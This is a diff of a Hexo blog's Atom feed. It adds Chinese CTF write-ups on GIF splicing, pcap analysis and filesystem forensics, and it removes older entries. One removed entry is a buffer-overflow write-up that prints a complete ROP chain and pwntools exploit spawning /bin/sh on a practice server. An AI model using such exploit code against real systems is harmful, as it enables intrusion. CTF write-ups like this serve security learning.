@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-11-20T03:00:43.821Z</updated>
+  <updated>2019-11-20T11:40:30.851Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,86 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>glance-50</title>
+    <link href="http://yoursite.com/2019/11/20/glance-50/"/>
+    <id>http://yoursite.com/2019/11/20/glance-50/</id>
+    <published>2019-11-20T11:31:42.000Z</published>
+    <updated>2019-11-20T11:40:30.851Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="src-攻防世界-glance-50"><a href="#src-攻防世界-glance-50" class="headerlink" title="[src = 攻防世界] glance-50"></a>[src = 攻防世界] glance-50</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>下载得到一张gif 图片，先用工具分离。</p><ol><li><p>使用gif逐帧提取工具“gif分离器”分离得到200张图片，都是窄条；</p></li><li><p>KALI下的convert工具分离得到200张窄条图片：</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert glance.gif flag.png</span><br></pre></td></tr></table></figure><p>看来需要进行拼接，都是窄条，考虑横向拼接，使用KALI下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">montage flag*.png -tile x1 -geometry +0+0 flag.png</span><br></pre></td></tr></table></figure><p>其中：<br>-tile是拼接时每行和每列的图片数，这里用x1，就是只一行</p><p>-geometry是首选每个图和边框尺寸，我们边框为0，图照原始尺寸即可</p><p>拼接完成得到flag。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;src-攻防世界-glance-50&quot;&gt;&lt;a href=&quot;#src-攻防世界-glance-50&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] glance-50&quot;&gt;&lt;/a&gt;[src = 攻防世界] glance-50&lt;/h2&gt;&lt;
+      
+    
+    </summary>
+    
+    
+      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
+    
+    
+      <category term="信息隐藏" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>embarss &amp; Cephalopod</title>
+    <link href="http://yoursite.com/2019/11/20/embarss/"/>
+    <id>http://yoursite.com/2019/11/20/embarss/</id>
+    <published>2019-11-20T11:05:47.000Z</published>
+    <updated>2019-11-20T12:39:07.389Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="src-攻防世界-embarrass-amp-Cephalopod"><a href="#src-攻防世界-embarrass-amp-Cephalopod" class="headerlink" title="[src = 攻防世界] embarrass &amp; Cephalopod"></a>[src = 攻防世界] embarrass &amp; Cephalopod</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><h3 id="embarrass"><a href="#embarrass" class="headerlink" title="embarrass"></a>embarrass</h3><p>解压得到misc_02.pcapng。</p><ol><li><p>思路1：用wireshark打开，追踪TCP流，发现流数量很多，一直翻到第35个流，发现这个流是最大的，包含了8059个分组，可疑。将流保存为文本文件，然后使用查找功能，查找flag字符串，得到flag。</p></li><li><p>思路2：直接拿到linux下，对misc_02.pcapng进行字符串检索，得到flag。</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings misc_02.pcapng | grep flag</span><br></pre></td></tr></table></figure><p>其实还有更为直接对第三种方法，直接使用wireshark的字符串搜索功能，得到flag，如下图：</p><p><img src="./embrrass.PNG" alt="embarrass"></p><h3 id="Cephalopod"><a href="#Cephalopod" class="headerlink" title="Cephalopod"></a>Cephalopod</h3><p>同样得到pcapng文件。</p><ol><li><p>思路1：用wireshark打开，追踪TCP流，在第1流中发现flag.png.</p></li><li><p>思路2：直接拿到linux下，对misc_02.pcapng进行字符串检索，发现flag.png</p></li></ol><p>下一步找到flag.png图片。</p><ol><li><p>通过追踪流，然后利用十六进制编辑器保存数据得到图片，包含flag</p></li><li><p>使用tcpxtract 直接提取其中的图片，读取包含的flag。</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads<span class="comment"># tcpxtract -f 66b7f39d97364ca5a2f928a4e61b46ee.pcap</span></span><br></pre></td></tr></table></figure><p>如果没有安装，可以通过apt install tcpxtract安装即可。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;src-攻防世界-embarrass-amp-Cephalopod&quot;&gt;&lt;a href=&quot;#src-攻防世界-embarrass-amp-Cephalopod&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] embarrass &amp;am
+      
+    
+    </summary>
+    
+    
+      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
+    
+    
+      <category term="信息隐藏" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F/"/>
+    
+      <category term="Wireshark" scheme="http://yoursite.com/tags/Wireshark/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>getthekeytxt</title>
+    <link href="http://yoursite.com/2019/11/20/getthekeytxt/"/>
+    <id>http://yoursite.com/2019/11/20/getthekeytxt/</id>
+    <published>2019-11-20T03:20:11.000Z</published>
+    <updated>2019-11-20T03:27:06.648Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="src-攻防世界-Get-the-key-txt"><a href="#src-攻防世界-Get-the-key-txt" class="headerlink" title="[src = 攻防世界] Get-the-key.txt"></a>[src = 攻防世界] Get-the-key.txt</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>下载一个压缩包，解压得到forensic100。在KALI里面用file命令查看发现是一个文件系统。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file forensic100 </span></span><br><span class="line">forensic100: Linux rev 1.0 ext2 filesystem data, UUID=0b92a753-7ec9-4b20-8c0b-79c1fa140869</span><br></pre></td></tr></table></figure><p>然后用strings命令发现大量类似flag的字符串。一个个试会累死的。也同时发现了很多txt文件，尝试分离这些文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads/output/zip<span class="comment"># binwalk forensic100 </span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             Linux EXT filesystem, rev 1.0, ext2 filesystem data, UUID=0b92a753-7ec9-4b20-8c0b-79c1fa14fa14</span><br><span class="line">1049600       0x100400        gzip compressed data, has original file name: <span class="string">"key.txt"</span>, from Unix, last modified: 2014-10-01 06:00:52</span><br><span class="line">1050624       0x100800        gzip compressed data, has original file name: <span class="string">"key1.txt"</span>, from Unix, last modified: 2014-10-01 05:59:41</span><br><span class="line">1051648       0x100C00        gzip compressed data, has original file name: <span class="string">"key10.txt"</span>, from Unix, last modified: 2014-10-01 05:59:41</span><br><span class="line">1052672       0x101000        gzip compressed data, has original file name: <span class="string">"key100.txt"</span>, from Unix, last modified: 2014-10-01 05:59:41</span><br><span class="line">1053696       0x101400        gzip compressed data, has original file name: <span class="string">"key101.txt"</span>, from Unix, last modified: 2014-10-01 05:59:41</span><br><span class="line">1054720       0x101800        gzip compressed data, has original file name: <span class="string">"key102.txt"</span>, from Unix, last modified: 2014-10-01 05:59:41</span><br><span class="line">1055744       0x101C00        gzip compressed data, has original file name: <span class="string">"key103.txt"</span>, from Unix, last modified: 2014-10-01 05:59:41</span><br></pre></td></tr></table></figure><p>发现了大量分离的key文件,每一个里面都有大量flag。<br>根据题目提示，我们选择key.txt中的第一个flag提交成功。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;src-攻防世界-Get-the-key-txt&quot;&gt;&lt;a href=&quot;#src-攻防世界-Get-the-key-txt&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] Get-the-key.txt&quot;&gt;&lt;/a&gt;[src = 攻防世
+      
+    
+    </summary>
+    
+    
+      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
+    
+    
+      <category term="信息隐藏" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F/"/>
+    
+  </entry>
   
   <entry>
     <title>crypto-info</title>
@@ -434,81 +514,6 @@
     
     
       <category term="cookie" scheme="http://yoursite.com/tags/cookie/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>dafuq-manager-1</title>
-    <link href="http://yoursite.com/2019/11/15/dafuq-manager-1/"/>
-    <id>http://yoursite.com/2019/11/15/dafuq-manager-1/</id>
-    <published>2019-11-15T09:38:49.000Z</published>
-    <updated>2019-11-15T09:58:29.499Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="src-hackme-dafuq-manager-系列"><a href="#src-hackme-dafuq-manager-系列" class="headerlink" title="[src = hackme] dafuq-manager 系列"></a>[src = hackme] dafuq-manager 系列</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>dafuq-manager 1：Login as guest and find flag 1<br>dafuq-manager 2：Login as admin, code review and get flag 2<br> <a id="more"></a></p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><h3 id="dafuq-manager-1"><a href="#dafuq-manager-1" class="headerlink" title="dafuq-manager 1"></a>dafuq-manager 1</h3><p>首先根据提示以guest用户登录，看到一个文件列表，发现里面有一个see-me-if-you-need-tips.txt文件，打开提示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Do you know cookie? Create a cookie named `<span class="built_in">help</span>` with value `me`!</span><br></pre></td></tr></table></figure><p>要我们修改cookie，按照要求通过Firefox的Tamper data插件截获并修改插件得到弹窗提示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Very good. You know how to create cookie. How about tamper a cookie?</span><br></pre></td></tr></table></figure><p>说明思路正确，我们去查看原来对cookie，发现里面有一个“show_hidden=no”，我们将其改为yes，刷新页面，发现多了两个文件：<br>“.good.job.here.is.your.hidden.flag-1.txt”和“.where-is-flag-2-please-tell-me.txt”。</p><p>其中第一个文件中包含flag。第二个文件内容为“Try to login as admin! and you will get flag2”</p><h3 id="dafuq-manager-2"><a href="#dafuq-manager-2" class="headerlink" title="dafuq-manager 2"></a>dafuq-manager 2</h3><p>文件目录下还有一个文件为“source-code-in-dafuqManager.7z-please-download-it.txt”。意思是下载源码，所以这是典型对代码审计题目。</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>Cookie</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;src-hackme-dafuq-manager-系列&quot;&gt;&lt;a href=&quot;#src-hackme-dafuq-manager-系列&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] dafuq-manager 系列&quot;&gt;&lt;/a&gt;[src = hackme] dafuq-manager 系列&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;dafuq-manager 1：Login as guest and find flag 1&lt;br&gt;dafuq-manager 2：Login as admin, code review and get flag 2&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
-    
-    
-      <category term="cookie" scheme="http://yoursite.com/tags/cookie/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>rop</title>
-    <link href="http://yoursite.com/2019/10/15/rop/"/>
-    <id>http://yoursite.com/2019/10/15/rop/</id>
-    <published>2019-10-15T07:41:14.000Z</published>
-    <updated>2019-11-20T03:05:35.494Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="src-hackme-rop"><a href="#src-hackme-rop" class="headerlink" title="[src = hackme] rop"></a>[src = hackme] rop</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc hackme.inndy.tw 7704</span><br></pre></td></tr></table></figure><p>Tips: Buffer Overflow, ROP</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>用IDA打开下载的rop可执行文件，发现在overflow()函数里面的gets()调用处存在栈溢出。且溢出的变量在ebp-Ch的位置，所以举例返回地址为0xC+0x4的举例，即16个字节，也就是要在返回地址前面覆盖16个字节的任意数据。</p><p><img src="./rop1.PNG" alt="rop"></p><p>用checksec查看安全机制开启情况：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/rop$ checksec rop</span><br><span class="line">[*] <span class="string">'/home/bitsec/hackme/rop/rop'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>开启了NX机制（栈不可执行Windows平台上称其为DEP），意味着栈不可执行，也就意味着不能直接向栈里面写入shellcode，此时就应该使用ROP（Return-Oriented Programmming Exploit）机制了。攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。其主要思想是在栈缓冲区溢出的基础上，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程，达到预期利用目的。</p><p>然后使用readelf查看该程序使用的是静态库还是动态库。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/rop$ readelf -d rop</span><br><span class="line"></span><br><span class="line">There is no dynamic section <span class="keyword">in</span> this file.</span><br></pre></td></tr></table></figure><p>发现没有使用动态段，这样以来，问题就更简单了，直接使用直接用ROPgadget –binary rop –ropchain 就可以生成好rop利用链了。</p><p>输出如下的ROP链：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">- Step 5 -- Build the ROP chain</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"></span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080ea060) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080b8016) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0805466b) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080ea064) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080b8016) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0805466b) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080ea068) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080492d3) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0805466b) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080481c9) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080ea060) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080de769) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080ea068) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080ea068) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080492d3) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0806c943) <span class="comment"># int 0x80</span></span><br></pre></td></tr></table></figure><p>结合前面的16字节的任意填充，基于python的pwntool，编写下面的exp程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">offset=<span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process('./rop')</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'hackme.inndy.tw'</span>, <span class="number">7704</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">'A'</span>*offset      <span class="comment">#16 bytes A</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rop链</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">io.sendline(p)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p>执行得到shell，cat flag得到flag。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;src-hackme-rop&quot;&gt;&lt;a href=&quot;#src-hackme-rop&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] rop&quot;&gt;&lt;/a&gt;[src = hackme] rop&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;nc hackme.inndy.tw 7704&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;p&gt;Tips: Buffer Overflow, ROP&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="PWN" scheme="http://yoursite.com/categories/PWN/"/>
-    
-    
-      <category term="python" scheme="http://yoursite.com/tags/python/"/>
-    
-      <category term="栈溢出" scheme="http://yoursite.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
-    
-      <category term="ROP" scheme="http://yoursite.com/tags/ROP/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>whereisflag</title>
-    <link href="http://yoursite.com/2019/10/15/whereisflag/"/>
-    <id>http://yoursite.com/2019/10/15/whereisflag/</id>
-    <published>2019-10-15T06:46:09.000Z</published>
-    <updated>2019-11-20T03:05:35.494Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="src-hackme-where-is-flag"><a href="#src-hackme-where-is-flag" class="headerlink" title="[src = hackme] where is flag"></a>[src = hackme] where is flag</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>Do you know regular expression?<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>打开题目，下载一个压缩包，解压得到一个flag文件，打开发现大量字符，其中包含大量FLAG。根据题目提示，应该是要进行正则表达式匹配。</p><p><img src="./whereisflag.PNG" alt="flag"></p><h3 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h3><p>本题考察正则表达式的使用。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;src-hackme-where-is-flag&quot;&gt;&lt;a href=&quot;#src-hackme-where-is-flag&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] where is flag&quot;&gt;&lt;/a&gt;[src = hackme] where is flag&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;Do you know regular expression?&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
-    
-    
-      <category term="regular expression" scheme="http://yoursite.com/tags/regular-expression/"/>
     
   </entry>
   
